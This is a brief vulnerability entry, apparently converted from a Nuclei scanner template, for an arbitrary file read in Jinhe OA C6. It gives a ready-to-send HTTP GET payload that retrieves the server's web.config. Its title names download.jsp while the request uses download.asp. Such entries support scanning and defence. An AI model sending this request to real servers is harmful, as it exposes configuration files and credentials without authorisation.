# Vulnerability: Jinhe OA C6 download.jsp - Arbitary File Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`jinhe-oa-c6-lfi.yaml`)

## Description
There is an arbitrary file read vulnerability in Jinhe OA C6 download.jsp file, through which an attacker can obtain sensitive information in the server

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
```

